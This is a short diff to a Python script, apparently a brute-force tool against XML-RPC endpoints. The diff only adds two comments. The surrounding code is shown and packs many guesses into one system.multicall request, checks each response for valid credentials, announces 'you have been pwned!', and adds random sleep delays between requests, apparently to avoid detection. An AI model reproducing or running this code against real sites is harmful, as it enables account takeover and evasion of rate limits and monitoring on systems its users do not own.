@@ -38,6 +38,7 @@ def main():
                 n += 1
 
                 insert = "\n".join(insertlist)
+                # xml payload 
                 xml ='<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>' +\
                         f'\n {insert}' +\
                     '</data></array></value></param></params></methodCall>'
@@ -48,6 +49,7 @@ def main():
                 if found_credentials(content):
                     print(f"you have been pwned! Payload somewhere in Iteration {i / payloads_per_request}")
 
+                # random sleep delay on requests
                 wait_time = random.randrange(min_delay, max_delay) 
                 time.sleep(wait_time)
                 
